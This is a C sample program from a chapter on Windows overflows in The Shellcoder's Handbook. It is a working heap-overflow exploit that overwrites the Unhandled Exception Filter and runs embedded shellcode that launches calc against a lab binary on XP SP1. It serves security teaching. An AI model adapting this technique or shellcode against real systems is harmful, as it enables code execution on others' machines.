/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 8: Windows Overflows
Sample Program #8

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

#include <stdio.h>
#include <windows.h>

unsigned int GetAddress(char *lib, char *func);
void fixupaddresses(char *tmp, unsigned int x);

int main()
{
     unsigned char buffer[1000]="";
     unsigned char heap[8]="";
     unsigned char pebf[8]="";
     unsigned char shellcode[200]="";
     unsigned int address_of_system = 0;
     unsigned char tmp[8]="";
     unsigned int a = 0;
     int cnt = 0;

     printf("Getting address of system...\n");
     address_of_system = GetAddress("msvcrt.dll","system");
     if(address_of_system == 0)
             return printf("Failed to get address.\n");
     printf("Address of msvcrt.system\t\t\t= %.8X\n",address_of_system);
     strcpy(buffer,"heap1 ");
     while(cnt < 66)
     {
             strcat(buffer,"DDDD");
             cnt++;
     }

     // This is where EDI+0x74 points to so we
     // need to do a short jmp forwards
     strcat(buffer,"\xEB\x14");

     // some padding
     strcat(buffer,"\x44\x44\x44\x44\x44\x44");
     
     // This address (0x77C3BBAD : netapi32.dll XP SP1) contains 
     // a "call dword ptr[edi+0x74]" instruction. We overwrite 
     // the Unhandled Exception Filter with this address.

     strcat(buffer,"\xad\xbb\xc3\x77"); 

     // Pointer to the Unhandled Exception Filter
     strcat(buffer,"\xB4\x73\xED\x77"); // 77ED73B4

     cnt = 0;

     while(cnt < 21)
     {
             strcat(buffer,"\x90");
             cnt ++;
     }
     // Shellcode stuff to call system("calc");
     strcat(buffer,"\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9");
     fixupaddresses(tmp,address_of_system);
     strcat(buffer,tmp);
     strcat(buffer,"\xFF\xD1\x90\x90");
     printf("\nExecuting heap1.exe... calc should open.\n");
     system(buffer);
     return 0;
}

unsigned int GetAddress(char *lib, char *func)
{
     HMODULE l=NULL;
     unsigned int x=0;
     l = LoadLibrary(lib);
     if(!l)
             return 0;
     x = GetProcAddress(l,func);
     if(!x)
             return 0;
     return x;
}

void fixupaddresses(char *tmp, unsigned int x)
{    unsigned int a = 0;
     a = x;
     a = a << 24;
     a = a >> 24;
     tmp[0]=a;
     a = x;
     a = a >> 8;
     a = a << 24;
     a = a >> 24 ;
     tmp[1]=a;
     a = x;
     a = a >> 16;
     a = a << 24;
     a = a >> 24;
     tmp[2]=a;
     a = x;
     a = a >> 24;
     tmp[3]=a;
}
